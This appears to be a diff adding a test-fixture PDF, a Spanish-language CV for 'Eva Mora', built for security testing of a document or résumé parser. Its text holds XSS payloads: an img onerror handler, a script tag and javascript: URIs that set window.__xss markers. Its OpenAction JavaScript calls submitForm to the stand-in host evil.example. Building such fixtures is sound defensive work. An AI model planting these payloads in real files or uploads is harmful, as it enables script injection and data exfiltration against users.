@@ -1,0 +1,48 @@
+%PDF-1.4
+1 0 obj
+<< /Type /Catalog /Pages 2 0 R /OpenAction 5 0 R /Names << /JavaScript << /Names [(x) 5 0 R] >> >> >>
+endobj
+2 0 obj
+<< /Type /Pages /Kids [3 0 R] /Count 1 >>
+endobj
+3 0 obj
+<< /Type /Page /Parent 2 0 R /MediaBox [0 0 595 842] /Contents 4 0 R /Resources << /Font << /F1 6 0 R >> >> /Annots [7 0 R] >>
+endobj
+4 0 obj
+<< /Length 261 >>
+stream
+BT /F1 12 Tf 72 760 Td 16 TL
+(Eva <img src=x onerror=window.__xss=9> Mora) Tj T*
+(eva.mora@example.com) Tj T*
+(+34 611 000 111) Tj T*
+(javascript:window.__xss=10) Tj T*
+(EXPERIENCIA) Tj T*
+(Analista <script>window.__xss=11</script>) Tj T*
+(2020 - 2023) Tj T*
+ET
+endstream
+endobj
+5 0 obj
+<< /S /JavaScript /JS (app.alert('pdf'); this.submitForm('https://evil.example/');) >>
+endobj
+6 0 obj
+<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>
+endobj
+7 0 obj
+<< /Type /Annot /Subtype /Link /Rect [72 600 300 620] /A << /S /URI /URI (javascript:window.__xss=12) >> >>
+endobj
+xref
+0 8
+0000000000 65535 f 
+0000000009 00000 n 
+0000000126 00000 n 
+0000000183 00000 n 
+0000000325 00000 n 
+0000000637 00000 n 
+0000000739 00000 n 
+0000000809 00000 n 
+trailer
+<< /Size 8 /Root 1 0 R >>
+startxref
+932
+%%EOF
